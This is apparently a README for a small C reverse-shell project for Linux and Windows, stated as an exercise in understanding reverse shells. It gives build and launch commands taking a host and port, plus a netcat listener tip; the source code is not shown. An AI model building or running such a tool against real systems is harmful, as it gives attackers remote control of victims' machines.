# reverse-shell :unlock:

A simple reverse shell for Linux and Windows written in C.
The goal of this project was for understand how the reverse shell works and why it is dangerous to run unknow software on our computer.

## For Linux:

Run `Make` in terminal and launch with:

```
$ ./reverse <host> <port>
```
You can run a small listening server with netcat.

## For Windows:

Compile with `x86_64-w64-mingw32-gcc -o <name.exe> reverse_win.c -lwsock32 -lws2_32`

Open cmd and run with

```
$ ./reverse <host> <port>
```
